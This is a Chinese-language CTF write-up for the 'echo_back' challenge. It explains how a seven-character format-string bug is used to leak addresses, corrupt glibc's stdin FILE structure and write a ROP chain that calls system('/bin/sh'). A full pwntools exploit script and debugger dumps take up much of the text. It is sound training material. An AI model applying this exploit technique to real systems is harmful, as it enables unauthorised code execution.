# echo_back

题目来源: World of Attack & Defense

 ### checksec

```bash
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

### vul

```c
unsigned __int64 __fastcall sub_B80(_BYTE *a1)
{
  size_t nbytes; // [rsp+1Ch] [rbp-14h] long int
  unsigned __int64 v3; // [rsp+28h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  memset((char *)&nbytes + 4, 0, 8uLL);
  printf("length:", 0LL);
  _isoc99_scanf("%d", &nbytes);
  getchar();
  if ( (nbytes & 0x80000000) != 0LL || (signed int)nbytes > 6 )
    LODWORD(nbytes) = 7; //limits
  read(0, (char *)&nbytes + 4, (unsigned int)nbytes);
  if ( *a1 )
    printf("%s say:", a1);
  else
    printf("anonymous say:", (char *)&nbytes + 4);
  printf((const char *)&nbytes + 4);            // fmt vum
  return __readfsqword(0x28u) ^ v3;
}
```

明显的字符串漏洞,但是最多只允许输入7个字符.

### 思路

通过利用字符串漏洞泄漏libc基地址, elf基地址, 修改 _IO_FILE struct,然后打入stack 中的 &main ret构造rop链

### 泄漏libc基址

传入 %p调试到vfprintf函数堆栈如下:

```
 0x7ffe31470828 —▸ 0x7ffe3146e250 ◂— 'anonymous say:'
 07:0038│      0x7ffe31470830 —▸ 0x7f81d9132780 (_IO_stdfile_1_lock) ◂— 0x0
 08:0040│      0x7ffe31470838 —▸ 0x7f81d8e632c0 (__write_nocancel+7) ◂— cmp    rax, -0xfff
 09:0048│      0x7ffe31470840 —▸ 0x7f81d9339700 ◂— 0x7f81d9339700
 0a:0050│      0x7ffe31470848 ◂— 0xe
 0b:0058│      0x7ffe31470850 ◂— 0x6562b026
 0c:0060│      0x7ffe31470858 —▸ 0x7f81d91316a3 (_IO_2_1_stdout_+131) ◂— 0x132780000000000a 
 ...           ...
 28:0140│      0x7ffe31470938 ◂— 0x746df13682d53b00
 29:0148│      0x7ffe31470940 —▸ 0x562293252d30 ◂— push   r15
 2a:0150│      0x7ffe31470948 —▸ 0x7f81d8d8c830 (__libc_start_main+240) ◂— mov    edi, eax
 2b:0158│      0x7ffe31470950 —▸ 0x7ffe31470a28 —▸ 0x7ffe31470fb8

```

通过调试, 传入 %p打印时, 打印出0x7ffe31470830, 而 __libc_start_main+240 的地址在0x7ffe31470948, 调试不断加1进行核对地址,最终在 %19$p打印出libc_start_main + 240的地址.然后通过计算即可获取libc基址

```python
# leaking libc base
	sla('>>', str(2))
	sla(':', str(7))
	p = '%19$p'
	sl(p)
	ru('0x')
	libc_start_main = int(r(12),16) - 240
	libc_base = libc_start_main - lib.sym['__libc_start_main']
	li('libc_base:' + hex(libc_base))
	sys_addr = libc_base + lib.sym['system']
	sh_addr  = libc_base + lib.search('/bin/sh').next()
```

### 泄漏elf基址

传入 %14$p查看printf函数中堆栈分布如下


```
05:0028│ rdi  0x7ffc6b02ca80 ◂— 0xa7024343125 /* '%14$p\n' */
06:0030│      0x7ffc6b02ca88 ◂— 0xb8b63dff1d802400
07:0038│ rbp  0x7ffc6b02ca90 —▸ 0x7ffc6b02cac0 —▸ 0x55f4515b5d30 ◂— push   r15
08:0040│      0x7ffc6b02ca98 —▸ 0x55f4515b5d08 ◂— jmp    0x55f4515b5d0b
09:0048│      0x7ffc6b02caa0 —▸ 0x55f4515b5d30 ◂— push   r15
0a:0050│      0x7ffc6b02caa8 ◂— 0x200000000
0b:0058│      0x7ffc6b02cab0 ◂— 0x0
0c:0060│      0x7ffc6b02cab8 ◂— 0xb8b63dff1d802400
```

打印出0x55f4515b5d30 ◂— push   r15, 而这个位置刚好在init函数的起始位置.在文件中偏移为: 0xD30 ( push    r15),这就可以计算elf的偏移了.然后获取main, pop rid的地址.

```python
# leaking elf base
	sla('>>', str(2))
	sla(':', str(7))
	p = '%14$p'
	sl(p)
	ru('0x')
	elf_base = int(r(12),16) - 0xD30
	main_addr = elf_base + 0xC6C
	pop_rdi_ret = elf_base + 0xd93
	li('elf_base:' + hex(elf_base))
```



### 泄漏堆栈中main ret地址

下图为printf函数中的堆栈

```
pwndbg> stack 100
00:0000│ rsp  0x7fffb8e184a8 —▸ 0x55ff36954c55 ◂— nop    
01:0008│      0x7fffb8e184b0 —▸ 0x55ff36954ef8 ◂— xor    ebp, dword ptr [rsi] /* '3. exit' */
02:0010│      0x7fffb8e184b8 —▸ 0x7fffb8e18500 ◂— 0x0
03:0018│      0x7fffb8e184c0 ◂— 0xa32 /* '2\n' */
04:0020│      0x7fffb8e184c8 ◂— 0x7134b9900
05:0028│ rdi  0x7fffb8e184d0 ◂— 0xa7024353125 /* '%15$p\n' */
06:0030│      0x7fffb8e184d8 ◂— 0xc7f0a378134b9900
07:0038│ rbp  0x7fffb8e184e0 —▸ 0x7fffb8e18510 #泄漏该地址, 获取main ret
08:0040│      0x7fffb8e184e8 —▸ 0x55ff36954d08 ◂— jmp    0x55ff36954d0b
09:0048│      0x7fffb8e184f0 —▸ 0x55ff36954d30 ◂— push   r15
0a:0050│      0x7fffb8e184f8 ◂— 0x200000000
0b:0058│      0x7fffb8e18500 ◂— 0x0
0c:0060│      0x7fffb8e18508 ◂— 0xc7f0a378134b9900
0d:0068│      0x7fffb8e18510 —▸ 0x55ff36954d30 ◂— push   r15 # main rbp
0e:0070│      0x7fffb8e18518 —▸ 0x7fa5b79af830 (__libc_start_main+240) #mian的返回地址
```

以上0x7fffb8e18518就是我们要获取的main ret的堆栈地址, 在这里不能直接泄漏堆栈中的main ret地址,但可以通过泄漏 rbp地址来+8即可获取man ret.

```python
#leaking main ret in stack
	sla('>>', str(2))
	sla(':', str(7))
	p = '%12$p'
	sl(p)
	ru('0x')
	main_ret = int(r(12),16) + 0x8
```


### 修改_IO_FILE将数据打入stack

目前,准备工作基本完毕, 现在就是要靠修改main ret地址来劫持程序流, 但是我们想构造payload，往main_ret处写数据，但是光一个p64(main_ret)包装就占了8个字符，而我们最多允许输入7个字符，setName，它不是白放那里的，它有着重要的作用.

它也可以接受7个字符，我们可以把main_ret存入a1中，虽然只允许7个字符，p64()有8字节，但是末尾一般都是0，由于是低位存储，也就是数据的前导0被舍弃，没有影响，除非那个数据8字节没有前导0

然后，发现，%16$p输出的就是a1的数据,于是，可以先setName(p64(addr))，然后利用%16$n来对addr处写数据然而，我们这样来直接写main_ret处的数据，还是不行，因为我们构造的payload始终长度都会大于7,于是，就需要用到一个新知识了，为了绕过7个字符的限制，利用printf漏洞先去攻击scanf内部结构，然后就可以直接利用scanf往目标处输入数据，这就需要去了解scanf的源码.

#### _IO_FILE struct

```c
/*
_IO_FILE *stdin = (FILE *) &_IO_2_1_stdin_;    
_IO_FILE *stdout = (FILE *) &_IO_2_1_stdout_;    
_IO_FILE *stderr = (FILE *) &_IO_2_1_stderr_; 
*/
/* The tag name of this struct is _IO_FILE to preserve historic 
   C++ mangled names for functions taking FILE* arguments. 
   That name should not be used in new code.  */  
struct _IO_FILE  
{  
  int _flags;       /* High-order word is _IO_MAGIC; rest is flags. */  
  
  /* The following pointers correspond to the C++ streambuf protocol. */  
  char *_IO_read_ptr;   /* Current read pointer */  
  char *_IO_read_end;   /* End of get area. */  
  char *_IO_read_base;  /* Start of putback+get area. */  
  char *_IO_write_base; /* Start of put area. */  
  char *_IO_write_ptr;  /* Current put pointer. */  
  char *_IO_write_end;  /* End of put area. */  
  char *_IO_buf_base;   /* Start of reserve area. */  
  char *_IO_buf_end;    /* End of reserve area. */  
  
  /* The following fields are used to support backing up and undo. */  
  char *_IO_save_base; /* Pointer to start of non-current get area. */  
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */  
  char *_IO_save_end; /* Pointer to end of non-current get area. */  
  
  struct _IO_marker *_markers;  
  
  struct _IO_FILE *_chain;  
  
  int _fileno;  
  int _flags2;  
  __off_t _old_offset; /* This used to be _offset but it's too small.  */  
  
  /* 1+column number of pbase(); 0 is unknown. */  
  unsigned short _cur_column;  
  signed char _vtable_offset;  
  char _shortbuf[1];  
  
  _IO_lock_t *_lock;  
#ifdef _IO_USE_OLD_IO_FILE  
};  
```

#### _IO_new_file_underflow

看看文件的读取过程**_IO_new_file_underflow** **这个函数最终调用了_IO_SYSREAD****系统调用来读取文件。在这之前，它做了一些处理**

```c
int _IO_new_file_underflow (FILE *fp)  
{  
  ssize_t count;  
  
  /* C99 requires EOF to be "sticky".  */  
  if (fp->_flags & _IO_EOF_SEEN)  
    return EOF;  
  
  if (fp->_flags & _IO_NO_READS)  
    {  
      fp->_flags |= _IO_ERR_SEEN;  
      __set_errno (EBADF);  
      return EOF;  
    }  
  if (fp->_IO_read_ptr < fp->_IO_read_end)  //判断是否已经读完
    return *(unsigned char *) fp->_IO_read_ptr;  
  
  if (fp->_IO_buf_base == NULL)  
    {  
      /* Maybe we already have a push back pointer.  */  
      if (fp->_IO_save_base != NULL)  
    {  
      free (fp->_IO_save_base);  
      fp->_flags &= ~_IO_IN_BACKUP;  
    }  
      _IO_doallocbuf (fp);  
    }  
  
  /* FIXME This can/should be moved to genops ?? */  
  if (fp->_flags & (_IO_LINE_BUF|_IO_UNBUFFERED))  
    {  
      /* We used to flush all line-buffered stream.  This really isn't 
     required by any standard.  My recollection is that 
     traditional Unix systems did this for stdout.  stderr better 
     not be line buffered.  So we do just that here 
     explicitly.  --drepper */  
      _IO_acquire_lock (_IO_stdout);  
  
      if ((_IO_stdout->_flags & (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF))  
      == (_IO_LINKED | _IO_LINE_BUF))  
    _IO_OVERFLOW (_IO_stdout, EOF);  
  
      _IO_release_lock (_IO_stdout);  
    }  
  
  _IO_switch_to_get_mode (fp);  
  
  /* This is very tricky. We have to adjust those 
     pointers before we call _IO_SYSREAD () since 
     we may longjump () out while waiting for 
     input. Those pointers may be screwed up. H.J. */  
  fp->_IO_read_base = fp->_IO_read_ptr = fp->_IO_buf_base;  
  fp->_IO_read_end = fp->_IO_buf_base;  //重新设置新的 _IO_buf_base
  fp->_IO_write_base = fp->_IO_write_ptr = fp->_IO_write_end  
    = fp->_IO_buf_base;  
  //--------------------------------------
  count = _IO_SYSREAD (fp, fp->_IO_buf_base,  //系统向_IO_buf_base指向的缓冲区写入读取的数据
          fp->_IO_buf_end - fp->_IO_buf_base);//写入长度:fp->_IO_buf_end - fp->_IO_buf_base
    
  if (count <= 0)  
    {  
      if (count == 0)  
    fp->_flags |= _IO_EOF_SEEN;  
      else  
    fp->_flags |= _IO_ERR_SEEN, count = 0;  
  }  
  fp->_IO_read_end += count; //使 _IO_read_end指针向后移动 
  if (count == 0)  
    {  
      /* If a stream is read to EOF, the calling application may switch active 
     handles.  As a result, our offset cache would no longer be valid, so 
     unset it.  */  
      fp->_offset = _IO_pos_BAD;  
      return EOF;  
    }  
  if (fp->_offset != _IO_pos_BAD)  
    _IO_pos_adjust (fp->_offset, count);  
  return *(unsigned char *) fp->_IO_read_ptr;  
}
```

#### 利用

IO_SYSREAD系统调用，向fp->_IO_buf_base处写入读取的数据，并且长度为 fp->_IO_buf_end - fp->_IO_buf_base

要是能够修改_IO_buf_base和_IO_buf_end 那么就可以实现任意位置和想要的长度

首先需要定位到_IO_2_1_stdin_结构体在内存中的位置，然后再定位到_IO_buf_base 的位置，_IO_buf_base位于结构体中的第8个，所以，它的_IO_buf_base_addr = _IO_buf_base + 0x8 * 7 (注意结构体对齐,int占用内存8字节,所以为 0x8 * 7 而不是 0x8 * 6 + 4)

```python
	#leaking_IO_buf_base
	_IO_2_1_stdin_ = libc_base + lib.sym['_IO_2_1_stdin_']
	_IO_buf_base = _IO_2_1_stdin_ + 0x8 * 7
	li('_IO_buf_base' + hex(_IO_buf_base))
```

来看看_IO_buf_base的值
```
0x7ffb6a2b08e0 <_IO_2_1_stdin_>:	0x00000000fbad208b	0x00007ffb6a2b0964
0x7ffb6a2b08f0 <_IO_2_1_stdin_+16>:	0x00007ffb6a2b0964	0x00007ffb6a2b0963
0x7ffb6a2b0900 <_IO_2_1_stdin_+32>:	0x00007ffb6a2b0963	0x00007ffb6a2b0963
0x7ffb6a2b0910 <_IO_2_1_stdin_+48>:	0x00007ffb6a2b0963	0x00007ffb6a2b0963 //IO_buf_base
0x7ffb6a2b0920 <_IO_2_1_stdin_+64>:	0x00007ffb6a2b0964	0x0000000000000000 //IO_buf_end
0x7ffb6a2b0930 <_IO_2_1_stdin_+80>:	0x0000000000000000	0x0000000000000000
0x7ffb6a2b0940 <_IO_2_1_stdin_+96>:	0x0000000000000000	0x0000000000000000
0x7ffb6a2b0950 <_IO_2_1_stdin_+112>:	0x0000000000000000	0xffffffffffffffff
0x7ffb6a2b0960 <_IO_2_1_stdin_+128>:	0x000000000a000000	0x00007ffb6a2b2790
0x7ffb6a2b0970 <_IO_2_1_stdin_+144>:	0xffffffffffffffff	0x0000000000000000
0x7ffb6a2b0980 <_IO_2_1_stdin_+160>:	0x00007ffb6a2b09c0	0x0000000000000000
0x7ffb6a2b0990 <_IO_2_1_stdin_+176>:	0x0000000000000000	0x0000000000000000
0x7ffb6a2b09a0 <_IO_2_1_stdin_+192>:	0x00000000ffffffff	0x0000000000000000
0x7ffb6a2b09b0 <_IO_2_1_stdin_+208>:	0x0000000000000000	0x00007ffb6a2af6e0
```
先是stdin的位置,当前位于0x7ffb6a2b08e0

然后是_IO_buf_base，它位于0x7ffb6a2b08e0 + 0x8 * 7 = 0x7ffb6a2b0918 ，它的值为0x00007ffb6a2b0963 ， 并且要知道，它的值相对_IO_2_1_stdin_的地址总是不变的，假如我们把_IO_buf_base的低一字节覆盖为0，那么他就变成了0x00007ffb6a2b0900 ，也就是0x7ffb6a2b08e0 + 0x8 * 4处，跑到了结构体内部去了，是结构体中的第5个数据处，也是_IO_write_base处，并且由于_IO_buf_end没变，那么我们可以从0x00007ffb6a2b0900处向后输入0x64-0x00 = 0x64个字符，那么就能把_IO_buf_base和_IO_buf_end都覆盖成关键地址，就能绕过7个字符的输入限制,且可以实现write anything anywhere

先来覆盖_IO_buf_base的低1字节为0

```python
	#modify _IO_buf_base
	sla('>>', str(1))
	p = p64(_IO_buf_base)
	sl(p)
	sla('>>', str(2))
	sla(':', str(7))
	p = '%16$hhn' #不打印,即个数为0
	sl(p)
```

接下来，就可以覆盖结构体里的一些数据了

对于_IO_buf_base之前的数据(_IO_write_base_IO_write_ptr, _IO_write_end)，最好原样的放回，不然不知道会出现什么问题，经过调试，发现它们的值都是0x83 + _IO_2_1_stdin_addr，然后接下来，覆盖_IO_buf_base和_IO_buf_end，将它设置为堆栈中的&main ret, 然后即可实现写入数据时,就会向堆栈中写入数据,前提还需满足一些条件.

于是，payload

```python
	#build payload to modify _IO_2_1_stdin struct
	p = p64(_IO_2_1_stdin_ + 0x83) * 3
	p += p64(main_ret) + p64(main_ret + 0x8 * 3)
	sla('>>', str(2))
	sa(':', p) #length:
	sl('')
```

在length:后面发送payload, 因为这个地方用到了scanf

现在，得绕过一个判断，这样调用scanf 输入数据时，才会往缓冲区写入输入的数据

```c
 if (fp->_IO_read_ptr < fp->_IO_read_end)  //判断是否已经读完, 想要能写入缓冲数据,就得把让ptr >= end,这样才能使新的数据重新读入到缓冲区里 
    return *(unsigned char *) fp->_IO_read_ptr;  
```

之前，覆盖结构体数据时，后面执行了这一步，使得 fp->_IO_read_end += count 相当于fp->_IO_read_end += len(p)

```c
fp->_IO_read_end = fp->_IO_buf_base;  //重新设置新的 _IO_buf_base
....          ....
count = _IO_SYSREAD (fp, fp->_IO_buf_base,  //系统向_IO_buf_base指向的缓冲区写入读取的数据
          fp->_IO_buf_end - fp->_IO_buf_base);//写入长度:fp->_IO_buf_end - fp->_IO_buf_base
....          ....
fp->_IO_read_end += count; //使 _IO_read_end指针向后移动
```
下面为输入之前的_IO_2_1_stdin_

```
0x7fa95326b8e0 <_IO_2_1_stdin_>:	0x00000000fbad208b	0x00007fa95326b901 //_IO_read_ptr
									//IO_read_end
0x7fa95326b8f0 <_IO_2_1_stdin_+16>:	0x00007fa95326b928	0x00007fa95326b900
0x7fa95326b900 <_IO_2_1_stdin_+32>:	0x00007fa95326b963	0x00007fa95326b963
0x7fa95326b910 <_IO_2_1_stdin_+48>:	0x00007fa95326b963	0x00007ffddf79fbe8
0x7fa95326b920 <_IO_2_1_stdin_+64>:	0x00007ffddf79fc00	0x0000000000000000
```

而 getchar() 的作用是使fp->_IO_read_ptr + 1

由于在覆盖结构体后，scanf的后面有一个getchar，执行了一次，所以还需要调用len(p)-1次getchar()，使_IO_read_ptr ==  PIO_read_end

```python
	#call getchar() make fp->_IO_read_ptr == fp->_IO_read_end
	for i in range(0, len(p) - 1):
		sla('>>', str(2))
		sla(':', ',')
		sl(' ')	
```

调用 len(p) - 1次getchar()后, _IO_2_1_stdin_ 如下

```
pwndbg> x /40gx &_IO_2_1_stdin_
0x7f1a9a51f8e0 <_IO_2_1_stdin_>:	0x00000000fbad208b	0x00007f1a9a51f928 //_IO_read_ptr
                                    //IO_read_end
0x7f1a9a51f8f0 <_IO_2_1_stdin_+16>:	0x00007f1a9a51f928	0x00007f1a9a51f900
0x7f1a9a51f900 <_IO_2_1_stdin_+32>:	0x00007f1a9a51f963	0x00007f1a9a51f963
0x7f1a9a51f910 <_IO_2_1_stdin_+48>:	0x00007f1a9a51f963	0x00007fff14080e88
0x7f1a9a51f920 <_IO_2_1_stdin_+64>:	0x00007fff14080ea0	0x0000000000000000
0x7f1a9a51f930 <_IO_2_1_stdin_+80>:	0x0000000000000000	0x0000000000000000

```

### 构造rop链

然后再次输入的时候,输入的数据就会在stack中了,现在就可以构造rop链.

```python
	#build rop chail
	sla('>>', str(2))
	p = p64(pop_rdi_ret) + p64(sh_addr) + p64(sys_addr)
	sla(':', p) #length:
	sl('')	
```

下面为输入修改后的堆栈


```
pwndbg> stack 50
00:0000│ rsp  0x7fff92ceeed8 —▸ 0x55c9b5337ad4 ◂— movzx  eax, byte ptr [rbp - 0x10]
01:0008│ rsi  0x7fff92ceeee0 ◂— 0x0
02:0010│      0x7fff92ceeee8 ◂— 0x4a74f6baf7ec8d00
03:0018│ rbp  0x7fff92ceeef0 —▸ 0x7fff92ceef00 —▸ 0x7fff92ceef30 —▸ 0x55c9b5337d30 ◂— push   r15
04:0020│      0x7fff92ceeef8 —▸ 0x55c9b5337b43 ◂— pop    rbp
05:0028│      0x7fff92ceef00 —▸ 0x7fff92ceef30 —▸ 0x55c9b5337d30 ◂— push   r15
06:0030│      0x7fff92ceef08 —▸ 0x55c9b5337ccd ◂— mov    dword ptr [rbp - 0x14], eax
07:0038│      0x7fff92ceef10 —▸ 0x55c9b5337d30 ◂— push   r15
08:0040│      0x7fff92ceef18 ◂— 0xffffffda00000001
09:0048│      0x7fff92ceef20 —▸ 0x7f53670f8918 (_IO_2_1_stdin_+56) —▸ 0x7fff92ceef38 —▸ 0x55c9b5337d93 ◂— pop    rdi
0a:0050│      0x7fff92ceef28 ◂— 0x4a74f6baf7ec8d00
0b:0058│      0x7fff92ceef30 —▸ 0x55c9b5337d30 ◂— push   r15
0c:0060│      0x7fff92ceef38 —▸ 0x55c9b5337d93 ◂— pop    rdi //修改为pop_rdi _ret
0d:0068│      0x7fff92ceef40 —▸ 0x7f5366ec0d57 ◂— 0x68732f6e69622f /* '/bin/sh' */
0e:0070│      0x7fff92ceef48 —▸ 0x7f5366d79390 (system) ◂— test   rdi, rdi

```

### getshell

只需使main函数ret即可

```python
#get shell
	sla('>>', str(3))

```

### 完整exp

```python
#!/usr/bin/env python
#-*- coding:utf-8 -*-

# Author: I0gan
# Team  : D0g3

from pwn import *
#from LibcSearcher import LibcSearcher

#context.log_level='debug'
#context.terminal = ['konsole', '-x', 'bash', 'c']
#context.terminal = 'konsole'
#context(arch = 'i386', os = 'linux', log_level='debug')
context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile  = "echo_back"
libFile  = "./libc.so.6"

remoteIp = "111.198.29.45"
remotePort = 54180

LOCAL = 1
LIBC  = 1

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
pd32  = lambda x : p32(x).decode() #python3 not surport str + bytes
pd64  = lambda x : p64(x).decode()
li    = lambda x : log.info(x)
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------
def eb(length, text):
	sl(text)

#--------------------------Exploit--------------------------
def exploit():

	# leaking libc base
	sla('>>', str(2))
	sla(':', str(7))
	p = '%19$p'
	sl(p)
	ru('0x')
	libc_start_main = int(r(12),16) - 240
	libc_base = libc_start_main - lib.sym['__libc_start_main']
	li('libc_base:' + hex(libc_base))
	sys_addr = libc_base + lib.sym['system']
	sh_addr  = libc_base + lib.search('/bin/sh').next()
	
	# leaking elf base
	sla('>>', str(2))
	sla(':', str(7))
	p = '%14$p'
	sl(p)
	ru('0x')
	elf_base = int(r(12),16) - 0xD30
	main_addr = elf_base + 0xC6C
	pop_rdi_ret = elf_base + 0xd93
	li('elf_base:' + hex(elf_base))

	#leaking main ret in stack
	sla('>>', str(2))
	sla(':', str(7))
	p = '%12$p'
	sl(p)
	ru('0x')
	main_ret = int(r(12),16) + 0x8

	
	#leaking IO_buf_base
	_IO_2_1_stdin_ = libc_base + lib.sym['_IO_2_1_stdin_']
	_IO_buf_base = _IO_2_1_stdin_ + 0x8 * 7
	li('_IO_buf_base' + hex(_IO_buf_base))
		
    #modify _IO_buf_base
	sla('>>', str(1))
	p = p64(_IO_buf_base)
	sl(p)
	sla('>>', str(2))
	sla(':', str(7))
	p = '%16$hhn'
	sl(p)

	#build payload to modify _IO_2_1_stdin struct
	p = p64(_IO_2_1_stdin_ + 0x83) * 3
	p += p64(main_ret) + p64(main_ret + 0x8 * 3)
	sla('>>', str(2))
	sa(':', p) #length:
	sl('')
	
	#call getchar() make fp->_IO_read_ptr == fp->_IO_read_end
	for i in range(0, len(p) - 1):
		sla('>>', str(2))
		sla(':', ',')
		sl(' ')
	
	#build rop chail
	sla('>>', str(2))
	p = p64(pop_rdi_ret) + p64(sh_addr) + p64(sys_addr)
	sla(':', p) #length:
	sl('')
	#db()

	#get shell
	sla('>>', str(3))

	
def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		#io = exe.process()
		if LIBC:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIBC:
			lib = ELF(libFile)
	
	exploit()
	finish()
    
```

